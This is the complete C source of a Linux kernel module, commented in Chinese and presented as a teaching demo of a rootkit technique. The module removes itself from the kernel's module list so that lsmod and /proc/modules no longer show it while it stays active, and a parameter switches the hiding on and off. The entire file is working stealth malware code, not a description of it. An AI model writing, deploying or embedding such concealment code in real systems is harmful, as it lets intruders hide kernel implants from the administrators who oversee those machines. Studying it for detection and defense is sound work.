/*
 * rootkit_hidden_module.c
 * Rootkit内核模块 —— 隐藏自身模块信息
 * 
 * 原理：Linux内核通过双向链表管理已加载模块，/proc/modules
 *       读取该链表展示模块信息。本模块从链表中摘除自身节点，
 *       使/proc/modules和lsmod无法看到该模块，但模块仍正常工作。
 * 
 * 注意：此代码仅用于教学实验，请勿用于恶意目的
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/slab.h>
#include <linux/moduleparam.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Experiment");
MODULE_DESCRIPTION("Rootkit Hidden Module Demo");

static void hide_module(void);
static void show_module(void);

/* 保存模块在链表中的前驱节点指针 */
static struct list_head *prev_module;
static int module_hidden;

/* 控制是否隐藏模块：1=隐藏，0=显示 */
static int hide = 1;

static int set_hide(const char *val, const struct kernel_param *kp)
{
    int ret;

    ret = param_set_int(val, kp);
    if (ret)
        return ret;

    if (hide && !module_hidden) {
        hide_module();
        module_hidden = 1;
    } else if (!hide && module_hidden) {
        show_module();
        module_hidden = 0;
    }

    return 0;
}

static const struct kernel_param_ops hide_ops = {
    .set = set_hide,
    .get = param_get_int,
};

module_param_cb(hide, &hide_ops, &hide, 0644);
MODULE_PARM_DESC(hide, "Hide module from /proc/modules (1=hide, 0=show)");

/*
 * hide_module - 从内核模块链表中摘除当前模块
 * 
 * Linux内核维护一个全局的 modules 链表（定义在 kernel/module.c），
 * 每个模块的 list 成员挂载在该链表上。通过 list_del() 将当前
 * 模块从链表中移除后，/proc/modules 和 lsmod 将无法枚举到该模块。
 * 但模块的代码和数据仍在内核空间中，功能不受影响。
 */
static void hide_module(void)
{
    if (module_hidden)
        return;

    /* 保存前驱节点，以便后续恢复 */
    prev_module = THIS_MODULE->list.prev;
    
    /* 从模块链表中摘除 */
    list_del(&THIS_MODULE->list);
    
    printk(KERN_INFO "rootkit: module hidden from /proc/modules\n");
    module_hidden = 1;
}

/*
 * show_module - 将模块重新插入内核模块链表
 * 
 * 在模块卸载前，需要将模块重新挂回链表，否则内核在卸载时
 * 无法正确清理模块资源，可能导致内核崩溃。
 */
static void show_module(void)
{
    if (prev_module && module_hidden) {
        list_add(&THIS_MODULE->list, prev_module);
        printk(KERN_INFO "rootkit: module restored to /proc/modules\n");
        module_hidden = 0;
    }
}

static int __init rootkit_init(void)
{
    printk(KERN_INFO "rootkit: module loaded\n");
    
    /* 按参数决定是否隐藏 */
    if (hide)
        hide_module();
    
    return 0;
}

static void __exit rootkit_exit(void)
{
    /* 卸载前恢复模块可见性 */
    show_module();
    
    printk(KERN_INFO "rootkit: module unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
